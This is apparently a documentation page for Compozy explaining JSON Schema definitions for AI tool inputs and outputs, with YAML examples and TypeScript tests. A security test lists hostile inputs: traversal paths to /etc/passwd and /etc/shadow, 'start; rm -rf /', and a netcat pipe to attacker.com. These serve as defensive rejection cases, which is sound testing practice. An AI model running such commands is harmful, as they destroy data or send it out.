---
title: "Configuration Schemas"
description: "Comprehensive guide to defining tool interfaces using JSON Schema for input/output validation in Compozy workflows"
---

import { AlertTriangle, BookOpen, BrainCircuit, MessageSquare, Shield, ShieldCheck, TrendingUp, Zap } from "lucide-react";

# Configuration Schemas

Tool configuration schemas define the interface between AI agents and your tools using JSON Schema Draft 7. This guide covers how to create robust, validated tool configurations that ensure type safety and seamless integration with AI workflows.

## Schema Fundamentals

<Callout type="info">
Compozy uses JSON Schema Draft 7 for validation and automatically generates LLM function definitions from your tool schemas.
</Callout>

### Tool Configuration Structure

Every tool configuration follows this schema:

<Tabs>
<Tab title="Basic Structure">

```yaml
# Required fields
resource: "tool"              # Must be "tool" for autoloader
id: "unique-tool-id"          # Unique identifier (kebab-case)
description: "Tool purpose"   # Human-readable description

# Optional execution configuration
timeout: "30s"                # Execution timeout (Go duration)

# Schema definitions
input:                        # Input validation schema
  type: "object"
  properties: {}
  required: []

output:                       # Output validation schema
  type: "object"
  properties: {}

# Default parameters and environment
with:                         # Default input parameters
  param: "default_value"

env:                          # Environment variables
  VAR_NAME: "value"
```

</Tab>
<Tab title="Real Example">

```yaml
resource: "tool"
id: "code-formatter"
description: "A tool for formatting code with configurable options"
timeout: "30s"

input:
  type: object
  properties:
    code:
      type: string
      description: The code to format
      minLength: 1
    language:
      type: string
      description: The programming language
      enum: ["javascript", "typescript", "python", "go"]
    indent_size:
      type: integer
      description: The number of spaces for indentation
      minimum: 1
      maximum: 8
      default: 2
    use_tabs:
      type: boolean
      description: Whether to use tabs instead of spaces
      default: false
  required:
    - code
    - language

output:
  type: object
  properties:
    formatted_code:
      type: string
      description: The formatted code
  required:
    - formatted_code

with:
  indent_size: 2
  use_tabs: false

env:
  FORMATTER_VERSION: "1.0.0"
```

</Tab>
</Tabs>

### JSON Schema Validation

<FeatureCardList>
<FeatureCard
  title="Type Safety"
  description="Automatic validation of inputs and outputs ensures data integrity"
  icon="ShieldCheck"
  size="sm"
/>
<FeatureCard
  title="LLM Integration"
  description="Schemas automatically generate function definitions for AI agents"
  icon="BrainCircuit"
  size="sm"
/>
<FeatureCard
  title="Error Prevention"
  description="Catch validation errors before tool execution"
  icon="AlertTriangle"
  size="sm"
/>
<FeatureCard
  title="Documentation"
  description="Self-documenting tool interfaces with descriptions and examples"
  icon="BookOpen"
  size="sm"
/>
</FeatureCardList>

### JSON Schema Types

<Tabs>
<Tab title="Basic Types">

```yaml
input:
  type: "object"
  properties:
    name:
      type: "string"
      description: "User name"
      minLength: 1
      maxLength: 100
    age:
      type: "integer"
      minimum: 0
      maximum: 150
    email:
      type: "string"
      format: "email"
    active:
      type: "boolean"
      default: true
  required: ["name", "email"]
```

</Tab>
<Tab title="Advanced Types">

```yaml
input:
  type: "object"
  properties:
    # Array with item validation
    tags:
      type: "array"
      items:
        type: "string"
        minLength: 1
      minItems: 1
      maxItems: 10
      uniqueItems: true
    
    # Nested object
    metadata:
      type: "object"
      properties:
        version:
          type: "string"
          pattern: "^\\d+\\.\\d+\\.\\d+$"
        created_at:
          type: "string"
          format: "date-time"
      required: ["version"]
    
    # Union types
    value:
      anyOf:
        - type: "string"
        - type: "number"
        - type: "boolean"
```

</Tab>
</Tabs>

## Input Schema Design

<Callout type="tip">
Design your input schemas with AI agents in mind. Clear descriptions and appropriate constraints help LLMs understand how to use your tools effectively.
</Callout>

### Simple Input Schema

For basic tools with straightforward parameters:

```yaml title="tools/file-reader.yaml"
resource: "tool"
id: "file-reader"
description: "Read file contents with encoding support and size limits"

input:
  type: "object"
  properties:
    path:
      type: "string"
      description: "Path to the file to read"
      minLength: 1
      pattern: "^[^\\0]+$"  # Prevent null bytes
    encoding:
      type: "string"
      description: "File encoding"
      enum: ["utf8", "utf16", "ascii", "base64"]
      default: "utf8"
    max_size:
      type: "integer"
      description: "Maximum file size in bytes"
      minimum: 1
      maximum: 10485760  # 10MB
      default: 1048576   # 1MB
  required: ["path"]
  
  # Security validation
  additionalProperties: false
```

### Complex Input Schema

For tools with nested objects and arrays:

```yaml title="tools/data-processor.yaml"
resource: "tool"
id: "data-processor"
description: "Process structured data with configurable transformations"

input:
  type: "object"
  properties:
    data:
      type: "array"
      description: "Input data array to process"
      items:
        type: "object"
        additionalProperties: true
      minItems: 1
      maxItems: 10000

    transformations:
      type: "array"
      description: "Data transformation pipeline"
      items:
        type: "object"
        properties:
          type:
            type: "string"
            enum: ["filter", "map", "reduce", "sort", "group"]
            description: "Type of transformation to apply"

          config:
            type: "object"
            description: "Transformation configuration"
            properties:
              field:
                type: "string"
                description: "Field to operate on"
                minLength: 1
              operation:
                type: "string"
                description: "Operation to perform"
                minLength: 1
              value:
                description: "Operation value (type depends on operation)"
                anyOf:
                  - type: "string"
                  - type: "number"
                  - type: "boolean"
                  - type: "array"
                  - type: "object"
            required: ["field", "operation"]
            additionalProperties: false
        required: ["type", "config"]
      minItems: 1
      maxItems: 100

    output_format:
      type: "string"
      description: "Output format"
      enum: ["json", "csv", "xml", "yaml"]
      default: "json"

    options:
      type: "object"
      description: "Processing options"
      properties:
        parallel:
          type: "boolean"
          description: "Enable parallel processing"
          default: false
        batch_size:
          type: "integer"
          description: "Batch size for processing"
          minimum: 1
          maximum: 1000
          default: 100
        strict_mode:
          type: "boolean"
          description: "Enable strict validation"
          default: true
      additionalProperties: false

  required: ["data", "transformations"]
  additionalProperties: false
```

### Conditional Schema

Use conditional logic for dynamic validation:

```yaml title="tools/api-client.yaml"
resource: "tool"
id: "api-client"
description: "HTTP client with method-specific validation"

input:
  type: "object"
  properties:
    method:
      type: "string"
      enum: ["GET", "POST", "PUT", "DELETE", "PATCH"]
      description: "HTTP method"

    url:
      type: "string"
      format: "uri"
      description: "Request URL"
      pattern: "^https?://"

    headers:
      type: "object"
      description: "HTTP headers"
      additionalProperties:
        type: "string"
        minLength: 1
      default: {}

    body:
      description: "Request body for POST/PUT/PATCH"
      anyOf:
        - type: "string"
        - type: "object"
        - type: "array"

    auth:
      type: "object"
      description: "Authentication configuration"
      properties:
        type:
          type: "string"
          enum: ["basic", "bearer", "api_key"]
        credentials:
          type: "object"
          description: "Authentication credentials"
      required: ["type", "credentials"]

  required: ["method", "url"]
  additionalProperties: false

  # Conditional validation - require body for write operations
  allOf:
    - if:
        properties:
          method:
            enum: ["POST", "PUT", "PATCH"]
      then:
        required: ["method", "url", "body"]
    - if:
        properties:
          method:
            enum: ["GET", "DELETE"]
      then:
        not:
          required: ["body"]
```

## Output Schema Design

<Callout type="note">
Output schemas are validated after tool execution to ensure your tools return consistent, well-structured data that AI agents can reliably process.
</Callout>

### Structured Output Schema

Define clear output contracts for predictable tool behavior:

```yaml title="tools/weather-api.yaml"
resource: "tool"
id: "weather-api"
description: "Weather data fetcher with structured output"

output:
  type: "object"
  properties:
    location:
      type: "object"
      description: "Location information"
      properties:
        city:
          type: "string"
          description: "City name"
        country:
          type: "string"
          description: "Country name"
        coordinates:
          type: "object"
          description: "Geographic coordinates"
          properties:
            lat:
              type: "number"
              minimum: -90
              maximum: 90
            lon:
              type: "number"
              minimum: -180
              maximum: 180
          required: ["lat", "lon"]
      required: ["city", "country", "coordinates"]

    current:
      type: "object"
      description: "Current weather conditions"
      properties:
        temperature:
          type: "number"
          description: "Temperature in Celsius"
        humidity:
          type: "integer"
          description: "Humidity percentage"
          minimum: 0
          maximum: 100
        pressure:
          type: "number"
          description: "Atmospheric pressure in hPa"
          minimum: 0
        wind_speed:
          type: "number"
          description: "Wind speed in m/s"
          minimum: 0
        conditions:
          type: "string"
          description: "Weather conditions"
          enum: ["sunny", "cloudy", "rainy", "snowy", "stormy"]
        timestamp:
          type: "string"
          format: "date-time"
          description: "Timestamp of observation"
      required: ["temperature", "humidity", "conditions", "timestamp"]

    forecast:
      type: "array"
      description: "Weather forecast (up to 7 days)"
      items:
        type: "object"
        properties:
          date:
            type: "string"
            format: "date"
          temperature_high:
            type: "number"
            description: "High temperature in Celsius"
          temperature_low:
            type: "number"
            description: "Low temperature in Celsius"
          conditions:
            type: "string"
            enum: ["sunny", "cloudy", "rainy", "snowy", "stormy"]
        required: ["date", "temperature_high", "temperature_low", "conditions"]
      minItems: 1
      maxItems: 7

    metadata:
      type: "object"
      description: "Response metadata"
      properties:
        source:
          type: "string"
          description: "Data source"
        last_updated:
          type: "string"
          format: "date-time"
          description: "Last update timestamp"
        units:
          type: "string"
          enum: ["metric", "imperial"]
          default: "metric"
          description: "Unit system"
      required: ["source", "last_updated"]

  required: ["location", "current", "metadata"]
  additionalProperties: false
```

### Flexible Output Schema

For tools with variable output structures:

```yaml
# tools/data-analyzer.yaml
resource: "tool"
id: "data-analyzer"
description: "Flexible data analysis tool"

output:
  type: "object"
  properties:
    analysis_type:
      type: "string"
      enum: ["statistical", "pattern", "anomaly", "classification"]

    results:
      anyOf:
        # Statistical analysis
        - type: "object"
          properties:
            statistics:
              type: "object"
              properties:
                mean:
                  type: "number"
                median:
                  type: "number"
                mode:
                  type: "number"
                std_dev:
                  type: "number"
                min:
                  type: "number"
                max:
                  type: "number"
                count:
                  type: "integer"

        # Pattern analysis
        - type: "object"
          properties:
            patterns:
              type: "array"
              items:
                type: "object"
                properties:
                  pattern:
                    type: "string"
                  confidence:
                    type: "number"
                    minimum: 0
                    maximum: 1
                  frequency:
                    type: "integer"
                  examples:
                    type: "array"
                    items:
                      type: "string"

        # Anomaly detection
        - type: "object"
          properties:
            anomalies:
              type: "array"
              items:
                type: "object"
                properties:
                  value:
                    description: "Anomalous value"
                  score:
                    type: "number"
                    description: "Anomaly score"
                  context:
                    type: "object"
                    description: "Surrounding context"

    confidence:
      type: "number"
      minimum: 0
      maximum: 1
      description: "Overall confidence in results"

    processing_time:
      type: "number"
      description: "Processing time in milliseconds"

  required: ["analysis_type", "results", "confidence"]
```

## Advanced Schema Patterns

### Reusable Schema Components

Define reusable schema components:

```yaml
# tools/shared-schemas.yaml
$defs:
  # Common data types
  timestamp:
    type: "string"
    format: "date-time"
    description: "ISO 8601 timestamp"

  pagination:
    type: "object"
    properties:
      page:
        type: "integer"
        minimum: 1
        default: 1
      limit:
        type: "integer"
        minimum: 1
        maximum: 100
        default: 20
      total:
        type: "integer"
        minimum: 0
    required: ["page", "limit"]

  error_response:
    type: "object"
    properties:
      code:
        type: "string"
        description: "Error code"
      message:
        type: "string"
        description: "Error message"
      details:
        type: "object"
        description: "Additional error details"
    required: ["code", "message"]

  # Business objects
  user:
    type: "object"
    properties:
      id:
        type: "string"
        pattern: "^[a-zA-Z0-9-_]+$"
      email:
        type: "string"
        format: "email"
      name:
        type: "string"
        minLength: 1
        maxLength: 100
      created_at:
        $ref: "#/$defs/timestamp"
      updated_at:
        $ref: "#/$defs/timestamp"
    required: ["id", "email", "name"]

# Tool using shared schemas
resource: "tool"
id: "user-manager"
description: "User management operations"

input:
  type: "object"
  properties:
    operation:
      type: "string"
      enum: ["create", "read", "update", "delete", "list"]

    user_data:
      $ref: "#/$defs/user"

    pagination:
      $ref: "#/$defs/pagination"

  required: ["operation"]

output:
  oneOf:
    - $ref: "#/$defs/user"
    - type: "object"
      properties:
        users:
          type: "array"
          items:
            $ref: "#/$defs/user"
        pagination:
          $ref: "#/$defs/pagination"
    - $ref: "#/$defs/error_response"
```

### Dynamic Schema Validation

Create schemas that adapt based on input:

```yaml
# tools/dynamic-validator.yaml
resource: "tool"
id: "dynamic-validator"
description: "Dynamic validation based on data type"

input:
  type: "object"
  properties:
    data_type:
      type: "string"
      enum: ["user", "product", "order", "custom"]

    data:
      description: "Data to validate"

    custom_schema:
      type: "object"
      description: "Custom validation schema"

  required: ["data_type", "data"]

  # Dynamic validation based on data_type
  allOf:
    - if:
        properties:
          data_type:
            const: "user"
      then:
        properties:
          data:
            type: "object"
            properties:
              id:
                type: "string"
              email:
                type: "string"
                format: "email"
              age:
                type: "integer"
                minimum: 0
            required: ["id", "email"]

    - if:
        properties:
          data_type:
            const: "product"
      then:
        properties:
          data:
            type: "object"
            properties:
              sku:
                type: "string"
              name:
                type: "string"
              price:
                type: "number"
                minimum: 0
            required: ["sku", "name", "price"]

    - if:
        properties:
          data_type:
            const: "custom"
      then:
        required: ["data_type", "data", "custom_schema"]
```

## Schema Validation Best Practices

<FeatureCardList>
<FeatureCard
  title="Security First"
  description="Always validate inputs to prevent injection attacks and ensure data integrity"
  icon="Shield"
  size="sm"
/>
<FeatureCard
  title="Clear Descriptions"
  description="Provide detailed descriptions for AI agents to understand parameter usage"
  icon="MessageSquare"
  size="sm"
/>
<FeatureCard
  title="Appropriate Limits"
  description="Set reasonable constraints to prevent abuse and ensure performance"
  icon="TrendingUp"
  size="sm"
/>
<FeatureCard
  title="Fail Fast"
  description="Validate early to provide clear error messages and prevent execution issues"
  icon="Zap"
  size="sm"
/>
</FeatureCardList>

### Input Validation

<Tabs>
<Tab title="Comprehensive Example">

```yaml
# Production-ready input validation
input:
  type: "object"
  properties:
    # String validation with security patterns
    name:
      type: "string"
      minLength: 1
      maxLength: 100
      pattern: "^[a-zA-Z0-9\\s\\-_]+$"
      description: "Alphanumeric name with spaces, hyphens, underscores"

    # Numeric validation with business rules
    quantity:
      type: "integer"
      minimum: 1
      maximum: 1000
      multipleOf: 1
      description: "Quantity must be a positive integer"

    # Array validation with constraints
    tags:
      type: "array"
      items:
        type: "string"
        minLength: 1
        maxLength: 50
        pattern: "^[a-zA-Z0-9\\-_]+$"
      minItems: 1
      maxItems: 10
      uniqueItems: true
      description: "Array of unique alphanumeric tags"

    # Object validation with strict properties
    metadata:
      type: "object"
      properties:
        created_by:
          type: "string"
          minLength: 1
          maxLength: 100
        department:
          type: "string"
          enum: ["sales", "marketing", "engineering", "support"]
      additionalProperties: false
      required: ["created_by"]

    # Date validation
    start_date:
      type: "string"
      format: "date"
      description: "Start date in YYYY-MM-DD format"

    # Custom format validation
    phone:
      type: "string"
      pattern: "^\\+?[1-9]\\d{1,14}$"
      description: "Phone number in E.164 format"

    # Conditional validation
    notification_type:
      type: "string"
      enum: ["email", "sms", "push"]
      description: "Notification delivery method"

  required: ["name", "quantity"]
  additionalProperties: false

  # Conditional validation rules
  if:
    properties:
      notification_type:
        const: "email"
  then:
    properties:
      email:
        type: "string"
        format: "email"
        description: "Email address for notifications"
    required: ["email"]
```

</Tab>
<Tab title="Security Patterns">

```yaml
# Security-focused validation patterns
input:
  type: "object"
  properties:
    # File path validation (prevent directory traversal)
    file_path:
      type: "string"
      pattern: "^[a-zA-Z0-9\\._\\-/]+$"
      not:
        anyOf:
          - pattern: "\\.\\."
          - pattern: "^/"
          - pattern: "\\0"
      description: "Safe file path without traversal"

    # Command validation (prevent injection)
    command:
      type: "string"
      enum: ["start", "stop", "restart", "status"]
      description: "Allowed system commands"

    # URL validation (restrict to HTTPS)
    api_url:
      type: "string"
      format: "uri"
      pattern: "^https://"
      description: "HTTPS URL only"

    # Size limits (prevent DoS)
    content:
      type: "string"
      maxLength: 1048576  # 1MB
      description: "Content limited to 1MB"

    # Environment variable validation
    env_var:
      type: "string"
      pattern: "^[A-Z0-9_]+$"
      description: "Valid environment variable name"

  additionalProperties: false
```

</Tab>
</Tabs>

### Error Response Schema

Define consistent error response format:

```yaml
# Error handling schema
output:
  oneOf:
    # Success response
    - type: "object"
      properties:
        success:
          type: "boolean"
          const: true
        data:
          type: "object"
          # Success data schema
        metadata:
          type: "object"
          properties:
            processing_time:
              type: "number"
            version:
              type: "string"
      required: ["success", "data"]

    # Error response
    - type: "object"
      properties:
        success:
          type: "boolean"
          const: false
        error:
          type: "object"
          properties:
            code:
              type: "string"
              enum: [
                "VALIDATION_ERROR",
                "PROCESSING_ERROR",
                "TIMEOUT_ERROR",
                "NETWORK_ERROR",
                "PERMISSION_ERROR"
              ]
            message:
              type: "string"
              description: "Human-readable error message"
            details:
              type: "object"
              description: "Additional error context"
            timestamp:
              type: "string"
              format: "date-time"
          required: ["code", "message"]
      required: ["success", "error"]
```

## Schema Testing & Validation

<Callout type="tip">
Compozy automatically validates schemas at runtime, but testing your schemas during development helps catch issues early and ensures robust tool behavior.
</Callout>

### Schema Testing Strategy

<List>
<ListItem>**Unit Testing**: Test schema validation with various inputs</ListItem>
<ListItem>**Integration Testing**: Test schema validation within actual tool execution</ListItem>
<ListItem>**Security Testing**: Test with malicious inputs and edge cases</ListItem>
<ListItem>**Performance Testing**: Test with large inputs and complex schemas</ListItem>
</List>

### Validation Testing

<Tabs>
<Tab title="Basic Testing">

```typescript title="schema-validator.test.ts"
import { validateSchema } from './schema-validator';

describe('Tool Schema Validation', () => {
  const toolSchema = {
    input: {
      type: 'object',
      properties: {
        name: { type: 'string', minLength: 1 },
        age: { type: 'integer', minimum: 0 }
      },
      required: ['name']
    }
  };

  test('should validate correct input', () => {
    const validInput = { name: 'John', age: 30 };
    const result = validateSchema(validInput, toolSchema.input);
    expect(result.valid).toBe(true);
    expect(result.errors).toHaveLength(0);
  });

  test('should reject missing required field', () => {
    const invalidInput = { age: 30 };
    const result = validateSchema(invalidInput, toolSchema.input);
    expect(result.valid).toBe(false);
    expect(result.errors).toContain('name is required');
  });

  test('should reject invalid data type', () => {
    const invalidInput = { name: 'John', age: 'thirty' };
    const result = validateSchema(invalidInput, toolSchema.input);
    expect(result.valid).toBe(false);
    expect(result.errors).toContain('age must be integer');
  });

  test('should handle edge cases', () => {
    const edgeCases = [
      { name: '', age: 25 },  // Empty string
      { name: 'John', age: -5 },  // Negative number
      { name: 'John', age: 25, extra: 'field' },  // Extra property
    ];

    edgeCases.forEach(input => {
      const result = validateSchema(input, toolSchema.input);
      expect(result.valid).toBe(false);
    });
  });
});
```

</Tab>
<Tab title="Security Testing">

```typescript title="schema-security.test.ts"
import { validateSchema } from './schema-validator';

describe('Schema Security Validation', () => {
  const secureSchema = {
    input: {
      type: 'object',
      properties: {
        file_path: {
          type: 'string',
          pattern: '^[a-zA-Z0-9\\._\\-/]+$',
          not: {
            anyOf: [
              { pattern: '\\.\\.' },
              { pattern: '^/' },
              { pattern: '\\0' }
            ]
          }
        },
        command: {
          type: 'string',
          enum: ['start', 'stop', 'restart', 'status']
        }
      },
      required: ['file_path', 'command'],
      additionalProperties: false
    }
  };

  test('should reject directory traversal attempts', () => {
    const maliciousInputs = [
      { file_path: '../../../etc/passwd', command: 'start' },
      { file_path: './../../secrets', command: 'start' },
      { file_path: '/etc/shadow', command: 'start' },
      { file_path: 'file\\0.txt', command: 'start' }
    ];

    maliciousInputs.forEach(input => {
      const result = validateSchema(input, secureSchema.input);
      expect(result.valid).toBe(false);
    });
  });

  test('should reject command injection attempts', () => {
    const maliciousInputs = [
      { file_path: 'file.txt', command: 'start; rm -rf /' },
      { file_path: 'file.txt', command: 'start && evil_command' },
      { file_path: 'file.txt', command: 'start | nc attacker.com 4444' }
    ];

    maliciousInputs.forEach(input => {
      const result = validateSchema(input, secureSchema.input);
      expect(result.valid).toBe(false);
    });
  });

  test('should accept valid inputs', () => {
    const validInputs = [
      { file_path: 'data/file.txt', command: 'start' },
      { file_path: 'logs/app.log', command: 'status' },
      { file_path: 'config.yaml', command: 'restart' }
    ];

    validInputs.forEach(input => {
      const result = validateSchema(input, secureSchema.input);
      expect(result.valid).toBe(true);
    });
  });
});
```

</Tab>
</Tabs>
```

### Schema Documentation

Generate documentation from schemas:

```typescript
// schema-docs.ts
interface SchemaDoc {
  field: string;
  type: string;
  required: boolean;
  description?: string;
  constraints?: string[];
}

function generateSchemaDoc(schema: any): SchemaDoc[] {
  const docs: SchemaDoc[] = [];

  if (schema.type === 'object' && schema.properties) {
    for (const [field, fieldSchema] of Object.entries(schema.properties)) {
      docs.push({
        field,
        type: fieldSchema.type,
        required: schema.required?.includes(field) || false,
        description: fieldSchema.description,
        constraints: extractConstraints(fieldSchema)
      });
    }
  }

  return docs;
}

function extractConstraints(schema: any): string[] {
  const constraints: string[] = [];

  if (schema.minLength) constraints.push(`minLength: ${schema.minLength}`);
  if (schema.maxLength) constraints.push(`maxLength: ${schema.maxLength}`);
  if (schema.minimum) constraints.push(`minimum: ${schema.minimum}`);
  if (schema.maximum) constraints.push(`maximum: ${schema.maximum}`);
  if (schema.pattern) constraints.push(`pattern: ${schema.pattern}`);
  if (schema.enum) constraints.push(`enum: ${schema.enum.join(', ')}`);

  return constraints;
}
```

## Next Steps

<ReferenceCardList>
<ReferenceCard
  title="Runtime Environment"
  description="Learn about Bun runtime, security model, and execution environment"
  href="/docs/core/tools/runtime-environment"
/>
<ReferenceCard
  title="External Integrations"
  description="Connect tools to external services and APIs"
  href="/docs/core/tools/external-integrations"
/>
<ReferenceCard
  title="Testing & Debugging"
  description="Validate your schemas and debug tool execution"
  href="/docs/core/tools/testing-debugging"
/>
<ReferenceCard
  title="Performance & Security"
  description="Optimize schemas and implement security best practices"
  href="/docs/core/tools/performance-security"
/>
</ReferenceCardList>
